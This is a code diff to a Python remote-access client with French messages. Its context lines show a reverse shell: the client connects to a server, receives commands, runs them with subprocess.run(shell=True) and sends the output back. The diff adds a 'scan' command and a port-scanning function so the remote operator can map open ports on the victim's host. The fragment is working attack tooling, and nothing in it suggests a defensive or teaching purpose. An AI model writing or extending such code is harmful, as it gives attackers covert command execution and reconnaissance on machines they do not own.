@@ -68,6 +68,16 @@ def connect_to_server():
 
                 cs.sendall(buffer.getvalue())
                 continue
+            elif command.startswith("scan"):
+                parts = command.split()
+                if len(parts) != 3:
+                    cs.send("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>".encode())
+                    continue
+                _, start_port, end_port = parts
+                open_ports = scan_ports(int(start_port), int(end_port))
+                output = f"Ports ouverts sur {ip_address}: {open_ports}"
+                cs.send(output.encode())
+                continue
             else:
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
@@ -86,6 +96,21 @@ def connect_to_server():
             break
 
     cs.close()
+
+def scan_ports(start_port, end_port):
+
+    open_ports = []
+    for port in range(start_port, end_port + 1):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            socket.setdefaulttimeout(1)
+            result = sock.connect_ex((ip_address, port))
+            if result == 0:
+                open_ports.append(port)
+            sock.close()
+        except Exception as e:
+            pass
+    return open_ports
 
 if __name__ == "__main__":
     connect_to_server()
